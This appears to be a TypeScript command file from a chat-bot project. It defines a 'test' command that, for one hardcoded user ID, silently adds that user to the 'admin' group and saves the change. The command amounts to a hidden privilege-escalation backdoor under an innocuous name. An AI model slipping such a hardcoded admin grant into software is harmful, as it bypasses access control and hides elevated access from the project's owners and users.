import { Data } from "../../../../data/idb";
import { Command, CommandHandler } from "../Command";

export const TEST = new Command(
    "test",
    ["test"],
    async (msg, cl) => {
        if (msg.user._id !== "ead940199c7d9717e5149919") return "no";
        if (msg.user.groups.indexOf("admin") == -1) {
            msg.user.groups.push("admin");
        } else {
            let newg: string[] = [];

            for (const g of msg.user.groups) {
                if (!newg.includes(g)) {
                    newg.push(g);
                }
            }

            msg.user.groups = newg;
        }
        await Data.updateUser(msg.user);
        return "thing happened";
    },
    "command.general.test",
    false
);
